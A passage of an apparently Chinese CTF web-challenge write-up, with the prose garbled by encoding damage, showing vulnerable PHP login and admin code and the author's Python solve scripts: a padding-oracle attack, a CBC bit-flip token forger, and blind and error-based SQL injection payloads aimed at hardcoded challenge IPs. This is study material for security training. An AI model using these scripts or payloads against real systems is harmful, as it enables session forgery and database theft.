  <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">16</span>; $i++)&#123;</div><div class="line">        $random_token .= substr($str, rand(<span class="number">1</span>, <span class="number">61</span>), <span class="number">1</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> $random_token;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_identity</span><span class="params">()</span></span>&#123;</div><div class="line">	<span class="keyword">global</span> $id;</div><div class="line">    $token = get_random_token();</div><div class="line">    $c = openssl_encrypt($id, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $token);</div><div class="line">    $_SESSION[<span class="string">'id'</span>] = base64_encode($c);</div><div class="line">    setcookie(<span class="string">"token"</span>, base64_encode($token));</div><div class="line">    <span class="keyword">if</span>($id === <span class="string">'admin'</span>)&#123;</div><div class="line">    	$_SESSION[<span class="string">'isadmin'</span>] = <span class="number">1</span>;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">    	$_SESSION[<span class="string">'isadmin'</span>] = <span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">test_identity</span><span class="params">()</span></span>&#123;</div><div class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">'id'</span>])) &#123;</div><div class="line">        $c = base64_decode($_SESSION[<span class="string">'id'</span>]);</div><div class="line">        $token = base64_decode($_COOKIE[<span class="string">"token"</span>]);</div><div class="line">        <span class="keyword">if</span>($u = openssl_decrypt($c, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $token))&#123;</div><div class="line">            <span class="keyword">if</span> ($u === <span class="string">'admin'</span>) &#123;</div><div class="line">                $_SESSION[<span class="string">'isadmin'</span>] = <span class="number">1</span>;</div><div class="line">                <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">            &#125;</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">            <span class="keyword">die</span>(<span class="string">"Error!"</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>])&amp;&amp;<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))&#123;</div><div class="line">	$username = mysql_real_escape_string($_POST[<span class="string">'username'</span>]);</div><div class="line">	$password = $_POST[<span class="string">'password'</span>];</div><div class="line">	$result = mysql_query(<span class="string">"select password from users where username='"</span> . $username . <span class="string">"'"</span>, $con);</div><div class="line">	$row = mysql_fetch_array($result);</div><div class="line">	<span class="keyword">if</span>($row[<span class="string">'password'</span>] === md5($password))&#123;</div><div class="line">  		get_identity();</div><div class="line">  		header(<span class="string">'location: ./admin.php'</span>);</div><div class="line">  	&#125;<span class="keyword">else</span>&#123;</div><div class="line">  		<span class="keyword">die</span>(<span class="string">'Login failed.'</span>);</div><div class="line">  	&#125;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">	<span class="keyword">if</span>(test_identity())&#123;</div><div class="line">        header(<span class="string">'location: ./admin.php'</span>);</div><div class="line">	&#125;<span class="keyword">else</span>&#123;</div><div class="line">        show_page();</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>admin.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line">session_start();</div><div class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</div><div class="line"></div><div class="line"><span class="keyword">if</span>(!$_SESSION[<span class="string">'isadmin'</span>])&#123;</div><div class="line">	<span class="keyword">die</span>(<span class="string">'You are not admin'</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))&#123;</div><div class="line">	$id = mysql_real_escape_string($_GET[<span class="string">'id'</span>]);</div><div class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'title'</span>]))&#123;</div><div class="line">		$title = mysql_real_escape_string($_GET[<span class="string">'title'</span>]);</div><div class="line">		$title = sprintf(<span class="string">"AND title='%s'"</span>, $title);</div><div class="line">	&#125;<span class="keyword">else</span>&#123;</div><div class="line">		$title = <span class="string">''</span>;</div><div class="line">	&#125;</div><div class="line">	$sql = sprintf(<span class="string">"SELECT * FROM article WHERE id='%s' $title"</span>, $id);</div><div class="line">	$result = mysql_query($sql,$con);</div><div class="line">	$row = mysql_fetch_array($result);</div><div class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($row[<span class="string">'title'</span>])&amp;&amp;<span class="keyword">isset</span>($row[<span class="string">'content'</span>]))&#123;</div><div class="line">		<span class="keyword">echo</span> <span class="string">"&lt;h1&gt;"</span>.$row[<span class="string">'title'</span>].<span class="string">"&lt;/h1&gt;&lt;br&gt;"</span>.$row[<span class="string">'content'</span>];</div><div class="line">		<span class="keyword">die</span>();</div><div class="line">	&#125;<span class="keyword">else</span>&#123;</div><div class="line">		<span class="keyword">die</span>(<span class="string">"This article does not exist."</span>);</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">	&lt;meta charset=<span class="string">"utf-8"</span>&gt;</div><div class="line">	&lt;title&gt;adminpage&lt;/title&gt;</div><div class="line">	&lt;link href=<span class="string">"css/bootstrap.min.css"</span> rel=<span class="string">"stylesheet"</span>&gt;</div><div class="line">    &lt;script src=<span class="string">"js/jquery.min.js"</span>&gt;&lt;/script&gt;</div><div class="line">    &lt;script src=<span class="string">"js/bootstrap.min.js"</span>&gt;&lt;/script&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">	&lt;nav class="navbar navbar-default" role="navigation"&gt;</div><div class="line">   &lt;div class="navbar-header"&gt;</div><div class="line">      &lt;a class="navbar-brand" href="#"&gt;åå°&lt;/a&gt;</div><div class="line">   &lt;/div&gt;</div><div class="line">   &lt;div&gt;</div><div class="line">      &lt;ul class="nav navbar-nav"&gt;</div><div class="line">         &lt;li class="active"&gt;&lt;a href="#"&gt;ç¼–è¾‘æ–‡ç« &lt;/a&gt;&lt;/li&gt;</div><div class="line">         &lt;li&gt;&lt;a href=<span class="string">"#"</span>&gt;è®¾ç½®&lt;/a&gt;&lt;/li&gt;</div><div class="line">      &lt;/ul&gt;</div><div class="line">   &lt;/div&gt;&lt;/nav&gt;</div><div class="line">   &lt;div class="panel panel-success"&gt;</div><div class="line">   &lt;div class="panel-heading"&gt;</div><div class="line">      &lt;h1 class="panel-title"&gt;æ–‡ç« åˆ—è¡¨&lt;/h1&gt;</div><div class="line">   &lt;/div&gt;</div><div class="line">   &lt;div class="panel-body"&gt;</div><div class="line">      &lt;li&gt;&lt;a href=<span class="string">'?id=1'</span>&gt;Welcome to myblog&lt;/a&gt;&lt;br&gt;&lt;/li&gt;</div><div class="line">      &lt;li&gt;&lt;a href=<span class="string">'?id=2'</span>&gt;Hello,world!&lt;/a&gt;&lt;br&gt;&lt;/li&gt;</div><div class="line">      &lt;li&gt;&lt;a href=<span class="string">'?id=3'</span>&gt;This is admin page&lt;/a&gt;&lt;br&gt;&lt;/li&gt;</div><div class="line">   &lt;/div&gt;</div><div class="line">   &lt;/div&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p>
<p>å¯ä»¥çœ‹åˆ°è¿™é“é¢˜åˆ†ä¸ºä¸¤ä¸ªéƒ¨åˆ†ï¼Œç¬¬ä¸€éƒ¨åˆ†ç®¡ç†å‘˜ç™»å½•ï¼Œç¬¬äºŒéƒ¨åˆ†å¤§æ¦‚ç‡æ˜¯ä¸ªæ³¨å…¥</p>
<h2 id="0x01ç®¡ç†å‘˜ç™»å½•"><a href="#0x01ç®¡ç†å‘˜ç™»å½•" class="headerlink" title="0x01ç®¡ç†å‘˜ç™»å½•"></a>0x01ç®¡ç†å‘˜ç™»å½•</h2><p>æµ‹è¯•å‘ç°<code>admin=123&amp;password[]=111</code>æˆ–è€…ç›´æ¥<code>å¼±å£ä»¤adminã€admin</code>å¯ä»¥ç›´æ¥ç™»å½•å¹¶è·³è½¬åˆ°<code>admin.php</code>ï¼Œä½†æ˜¯å´æç¤ºä¸æ˜¯çœŸæ­£çš„adminï¼ŒæŸ¥çœ‹admin.phpæºç ï¼Œå‘ç°åªæœ‰<code>$_SESSION[&#39;isadmin&#39;]</code>å­˜åœ¨æ—¶ï¼Œæ‰ç®—çœŸæ­£çš„ç®¡ç†å‘˜<br>è€Œlogin.phpä¸­æœ‰å…³sessionçš„æ“ä½œï¼Œå°±æ¶‰åŠåˆ°<code>get_identity()</code>å’Œ<code>test_identity()</code>ä¸¤ä¸ªå‡½æ•°<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_identity</span><span class="params">()</span></span>&#123;</div><div class="line">	<span class="keyword">global</span> $id;</div><div class="line">    $token = get_random_token();</div><div class="line">    $c = openssl_encrypt($id, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $token);</div><div class="line">    $_SESSION[<span class="string">'id'</span>] = base64_encode($c);</div><div class="line">    setcookie(<span class="string">"token"</span>, base64_encode($token));</div><div class="line">    <span class="keyword">if</span>($id === <span class="string">'admin'</span>)&#123;</div><div class="line">    	$_SESSION[<span class="string">'isadmin'</span>] = <span class="number">1</span>;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">    	$_SESSION[<span class="string">'isadmin'</span>] = <span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">test_identity</span><span class="params">()</span></span>&#123;</div><div class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">'id'</span>])) &#123;</div><div class="line">        $c = base64_decode($_SESSION[<span class="string">'id'</span>]);</div><div class="line">        $token = base64_decode($_COOKIE[<span class="string">"token"</span>]);</div><div class="line">        <span class="keyword">if</span>($u = openssl_decrypt($c, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $token))&#123;</div><div class="line">            <span class="keyword">if</span> ($u === <span class="string">'admin'</span>) &#123;</div><div class="line">                $_SESSION[<span class="string">'isadmin'</span>] = <span class="number">1</span>;</div><div class="line">                <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">            &#125;</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">            <span class="keyword">die</span>(<span class="string">"Error!"</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>è¿™ä¸¤ä¸ªå‡½æ•°å’Œ2017NJCTFçš„ä¸€é“cbcå­—èŠ‚ç¿»è½¬é¢˜å‡ ä¹ä¸€æ¨¡ä¸€æ ·ï¼Œè¿™é‡Œæˆ‘å‚è€ƒäº†<a href="http://www.jianshu.com/p/7f171477a603" target="_blank" rel="noopener">Pr0ph3t</a>å¤§ä½¬çš„æ–‡ç« ï¼Œé€šè¿‡æ„é€ ç‰¹å®šçš„token(IV)è¿›è¡Œ<code>CBCå­—èŠ‚ç¿»è½¬æ”»å‡»</code>ï¼Œä½¿å¾—æœåŠ¡å™¨è§£å‡ºæ¥çš„æ˜æ–‡ä¸º<code>admin</code>ï¼Œ<br>ä½†æ˜¯è¿™é‡Œä¸çŸ¥é“ <code>id</code>çš„å€¼<br>å†å‚è€ƒ<a href="http://www.freebuf.com/vuls/98156.html" target="_blank" rel="noopener">FreeBuff</a>çš„è¿™ç¯‡æ–‡ç« ï¼Œé€šè¿‡æ„é€ ç‰¹å®šçš„tokenï¼Œä¹Ÿå°±æ˜¯IVï¼Œåˆ©ç”¨<code>test_identity()</code>å‡½æ•°å¯¼è‡´çš„é¡µé¢è¿”å›ä¸åŒè¿›è¡Œ<code>PaddingOracleæ”»å‡»</code>ï¼Œä»è€Œæ¨å¯¼å‡ºä¸­é—´å€¼ï¼Œç„¶åæ±‚å‡ºæ˜æ–‡ï¼Œä¹Ÿå°±æ˜¯<code>id</code><br>æ€»ç»“ä¸€ä¸‹ï¼Œç¬¬ä¸€éƒ¨åˆ†æˆ‘ä»¬è¦åšçš„æœ‰ä»¥ä¸‹è¿™å‡ æ­¥<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1.å¼±å£ä»¤ç™»å½•</div><div class="line">2.PaddingOracleæ”»å‡»å¾—åˆ°id</div><div class="line">3.CBCå­—èŠ‚ç¿»è½¬æ”»å‡»ä¼ªé€ æˆçœŸæ­£çš„admin</div></pre></td></tr></table></figure></p>
<p>PaddingOracleæ”»å‡»è„šæœ¬å¦‚ä¸‹<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"><span class="comment">#-*- coding: utf-8 -*-</span></div><div class="line"><span class="comment">#by:CodeMonster</span></div><div class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> r1</div><div class="line"><span class="keyword">import</span> base64</div><div class="line">flag=<span class="string">''</span></div><div class="line">url=<span class="string">"http://111.231.111.54/login.php"</span></div><div class="line">token=base64.b64decode(<span class="string">"N2ZtWmZjSWJmaUtRNFNSeg=="</span>)</div><div class="line">id=<span class="string">''</span></div><div class="line">idhex=<span class="string">''</span></div><div class="line">n=<span class="number">15</span></div><div class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">16</span>):</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>*<span class="number">16</span>):</div><div class="line">        ok=<span class="string">''</span></div><div class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> flag:</div><div class="line">            ok+=chr((j+<span class="number">1</span>)^ord(k))</div><div class="line">        ss=(<span class="number">15</span>-j)*<span class="string">'\x00'</span>+chr(i)+ok</div><div class="line">        s=base64.b64encode(ss)</div><div class="line">        header=&#123;<span class="string">"Cookie"</span>: <span class="string">"PHPSESSID=0t4h76nv16i4m61noh2gli2nd5; token="</span>+s+<span class="string">";"</span>&#125;</div><div class="line">        r2=r1.get(url,headers=header)</div><div class="line">        <span class="comment">#print r2.text</span></div><div class="line">        <span class="keyword">if</span> <span class="string">"Error"</span> <span class="keyword">not</span> <span class="keyword">in</span> r2.text:</div><div class="line">            <span class="comment">#print (i^(j+1)),i,j</span></div><div class="line">            flag=chr(i^(j+<span class="number">1</span>))+flag</div><div class="line">            id=chr((i^(j+<span class="number">1</span>))^(ord(token[<span class="number">15</span>-j])))+id</div><div class="line">            idhex=hex((i^(j+<span class="number">1</span>))^(ord(token[<span class="number">15</span>-j])))+<span class="string">"-"</span>+idhex</div><div class="line">            <span class="keyword">print</span> j,id</div><div class="line">            <span class="keyword">print</span> j,idhex</div><div class="line">            <span class="keyword">break</span></div></pre></td></tr></table></figure></p>
<p>å…¶ä¸­tokenå’Œcookieè¦ä¿®æ”¹æˆç¬¬ä¸€æ­¥ç™»å½•æˆåŠŸåçš„tokenå’Œcookieï¼Œæœ€åèƒ½æ±‚å‡º14ä½idå’Œä¸€ä½0x01ï¼Œå¯ä»¥çˆ†ç ´æœ€åä¸€ä½</p>
<p>CBCå­—èŠ‚ç¿»è½¬æ”»å‡»è„šæœ¬<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"><span class="comment">#-*- coding: utf-8 -*-</span></div><div class="line"><span class="comment">#by:CodeMonster</span></div><div class="line"><span class="keyword">import</span> base64 <span class="keyword">as</span> b64</div><div class="line"><span class="keyword">import</span> binascii</div><div class="line">dic = open(<span class="string">"passsss.txt"</span>,<span class="string">"a"</span>)</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</div><div class="line">    source_str = chr(i)+<span class="string">'EZKIhn1dPhWY2P'</span>+<span class="string">'\x01'</span></div><div class="line">    target_srt = <span class="string">'admin'</span> + <span class="number">11</span> * <span class="string">'\x0b'</span></div><div class="line">    token = <span class="string">'cWMzdTJQMUxGSmJSRmt5Vw=='</span> <span class="comment">#ä½ è·å¾—çš„åˆå§‹IVçš„base64encodeå€¼</span></div><div class="line">    token = list(b64.b64decode(token))</div><div class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">0</span>,len(target_srt)):</div><div class="line">        token[x] = chr(ord(token[x]) ^ ord(target_srt[x]) ^ ord(source_str[x]))</div><div class="line">    sss=b64.b64encode(<span class="string">''</span>.join(token))</div><div class="line">    dic.write(<span class="string">""</span>.join(sss))</div><div class="line">    dic.write(<span class="string">""</span>.join(<span class="string">"\n"</span>))</div><div class="line">dic.close()</div></pre></td></tr></table></figure></p>
<p>ç„¶åå»burpsuiteé‡Œçˆ†ç ´tokenå°±å¥½ï¼Œå³å¯ç™»å½•ä¸ºç®¡ç†å‘˜</p>
<h2 id="0x02sqlæ³¨å…¥"><a href="#0x02sqlæ³¨å…¥" class="headerlink" title="0x02sqlæ³¨å…¥"></a>0x02sqlæ³¨å…¥</h2><p>è¿™éƒ¨åˆ†çš„æ ¸å¿ƒä»£ç ä¸»è¦æ˜¯è¿™å‡ å¥<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"> $id = mysql_real_escape_string($_GET[<span class="string">'id'</span>]);</div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'title'</span>]))&#123;</div><div class="line">	$title = mysql_real_escape_string($_GET[<span class="string">'title'</span>]);</div><div class="line">	$title = sprintf(<span class="string">"AND title='%s'"</span>, $title);</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">	$title = <span class="string">''</span>;</div><div class="line">&#125;</div><div class="line">$sql = sprintf(<span class="string">"SELECT * FROM article WHERE id='%s' $title"</span>, $id);</div><div class="line">$result = mysql_query($sql,$con);</div><div class="line">$row = mysql_fetch_array($result);</div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($row[<span class="string">'title'</span>])&amp;&amp;<span class="keyword">isset</span>($row[<span class="string">'content'</span>]))&#123;</div><div class="line">	<span class="keyword">echo</span> <span class="string">"&lt;h1&gt;"</span>.$row[<span class="string">'title'</span>].<span class="string">"&lt;/h1&gt;&lt;br&gt;"</span>.$row[<span class="string">'content'</span>];</div><div class="line">	<span class="keyword">die</span>();</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">	<span class="keyword">die</span>(<span class="string">"This article does not exist."</span>);</div><div class="line"> &#125;</div></pre></td></tr></table></figure></p>
<p>çœ‹åˆ°ç”¨äº†sprintfæ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œæƒ³åˆ°<a href="https://www.codemonster.cn/2017/10/31/2017-3th-fjwlkjaqds-writeup/">çœèµ›çš„æ³¨å…¥é¢˜</a><br>æµ‹è¯•äº†ä¸€ä¸‹<code>%1$&#39;</code>å¯ä»¥æˆåŠŸé€ƒé€¸å•å¼•å·ï¼Œæ„é€ ç›²æ³¨è„šæœ¬å¦‚ä¸‹ï¼Œåœ¨web1.keyçš„f14gå­—æ®µæ‰¾åˆ°flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"><span class="comment">#-*- coding: utf-8 -*-</span></div><div class="line"><span class="comment">#by:CodeMonster</span></div><div class="line"><span class="keyword">import</span> re</div><div class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> r</div><div class="line">payload=list(<span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZ@1234567890qwertyuiopasdfghjklzxcvbnm_&#123;&#125;.!,"</span>)</div><div class="line">data=<span class="string">''</span></div><div class="line">flag=<span class="string">''</span></div><div class="line"><span class="keyword">for</span> s <span class="keyword">in</span> range (<span class="number">0</span>,<span class="number">50</span>):</div><div class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range (<span class="number">1</span>,<span class="number">50</span>):</div><div class="line">		<span class="keyword">for</span> p <span class="keyword">in</span> payload:</div><div class="line">			header=&#123;<span class="string">"Cookie"</span>: <span class="string">"PHPSESSID=b1kkq3ohuavj53kkl4u29dg914; token=SUIEVxUzVHYpEQEOFFIiXQ==;"</span>&#125;</div><div class="line">			url=<span class="string">"http://111.231.111.54/admin.php?id=1&amp;title="</span></div><div class="line">			<span class="comment">#url+="%1$%27%20or%20(ascii(mid((select%20group_concat(column_NAME)%20from%20information_schema.COLUMNS%20where%20TABLE_SCHEMA=database()%20and%20table_name=0x6b6579),&#123;0&#125;,1))=&#123;1&#125;)%23".format(i,ord(p))</span></div><div class="line">			url+=<span class="string">"%1$%27%20or%20(ascii(mid((select%20f14g%20from%20web1.key),&#123;0&#125;,1))=&#123;1&#125;)%23"</span>.format(i,ord(p))</div><div class="line">			<span class="comment">#print url</span></div><div class="line">			r1=r.get(url,headers=header)</div><div class="line">			<span class="comment">#print r1.text</span></div><div class="line">			<span class="keyword">if</span> <span class="string">"myblog"</span> <span class="keyword">in</span> r1.text:</div><div class="line">				flag+=p</div><div class="line">				<span class="keyword">print</span> i,flag</div><div class="line">				<span class="keyword">break</span></div><div class="line"><span class="keyword">print</span> flag</div></pre></td></tr></table></figure>
<h1 id="â€œä»–ä»¬â€æœ‰ä»€ä¹ˆç§˜å¯†å‘¢"><a href="#â€œä»–ä»¬â€æœ‰ä»€ä¹ˆç§˜å¯†å‘¢" class="headerlink" title="â€œä»–ä»¬â€æœ‰ä»€ä¹ˆç§˜å¯†å‘¢?"></a>â€œä»–ä»¬â€æœ‰ä»€ä¹ˆç§˜å¯†å‘¢?</h1><p>ä¸€ä¸ªç®€å•åˆ°ä¸èƒ½å†ç®€å•çš„â€¦â€¦<br><a href="http://182.254.246.93/" target="_blank" rel="noopener">http://182.254.246.93/</a></p>
<p>index.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1.entrance.php</div><div class="line">2.There is no need to scan and brute force!</div><div class="line">3.Hacking for fun!</div></pre></td></tr></table></figure></p>
<h2 id="0x00å„ç§æ³¨å…¥éªšæ“ä½œå¾—åˆ°ä¸‹ä¸€å…³æ–‡ä»¶å"><a href="#0x00å„ç§æ³¨å…¥éªšæ“ä½œå¾—åˆ°ä¸‹ä¸€å…³æ–‡ä»¶å" class="headerlink" title="0x00å„ç§æ³¨å…¥éªšæ“ä½œå¾—åˆ°ä¸‹ä¸€å…³æ–‡ä»¶å"></a>0x00å„ç§æ³¨å…¥éªšæ“ä½œå¾—åˆ°ä¸‹ä¸€å…³æ–‡ä»¶å</h2><p>entrance.phpå­˜åœ¨æŠ¥é”™æ³¨å…¥<br>æ„é€ <code>1 and linestring(pro_id)</code>å¾—åˆ°è¡¨å<code>product_2017ctf</code>å’Œæ•°æ®åº“å<code>youcanneverfindme17</code><br>é€šè¿‡joinæ³¨å…¥å¾—åˆ°å­—æ®µå<code>d067a0fa9dc61a6e</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pro_id=1 and (select * from (select * from product_2017ctf as a join product_2017ctf as b using(pro_id,pro_name,owner)) as c);</div></pre></td></tr></table></figure></p>
<p>ä½†æ˜¯è¿™ä¸ªå­—æ®µåè¢«banäº†ï¼Œåªå¥½é€šè¿‡order byæ¥å¾—åˆ°d067a0fa9dc61a6eå­—æ®µçš„å†…å®¹ï¼Œè„šæœ¬å¦‚ä¸‹<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"><span class="comment">#-*- coding: utf-8 -*-</span></div><div class="line"><span class="comment">#by:CodeMonster</span></div><div class="line"><span class="keyword">import</span> requests</div><div class="line">r=requests.session()</div><div class="line">url=<span class="string">"http://182.254.246.93/entrance.php?"</span></div><div class="line">l=<span class="string">".0123456789abcdefghijklmnopqrstuvwxyz"</span></div><div class="line">k=<span class="string">""</span></div><div class="line">sec=<span class="string">""</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">36</span>):</div><div class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(len(l)):</div><div class="line">		payload=sec+l[j]</div><div class="line">		data=&#123;<span class="string">"pro_id"</span>:<span class="string">"3 union select 1,'test',4,'&#123;&#125;' from product_2017ctf order by 4"</span>.format(payload)&#125;</div><div class="line">		r1=r.post(url,data=data)</div><div class="line">		<span class="keyword">if</span> <span class="string">'nextentrance'</span> <span class="keyword">in</span> r1.text:</div><div class="line">			sec+=k</div><div class="line">			<span class="keyword">print</span> payload</div><div class="line">			<span class="keyword">break</span></div><div class="line">		k=l[j]</div><div class="line">		<span class="keyword">if</span> j==len(l)<span class="number">-1</span>:</div><div class="line">			sec+=k</div></pre></td></tr></table></figure></p>
<p>å¾—åˆ°çš„å†…å®¹å’Œå­—æ®µåæ‹¼æ¥å¾—åˆ°<code>d067a0fa9dc61a6e7195ca99696b5a896.php</code></p>
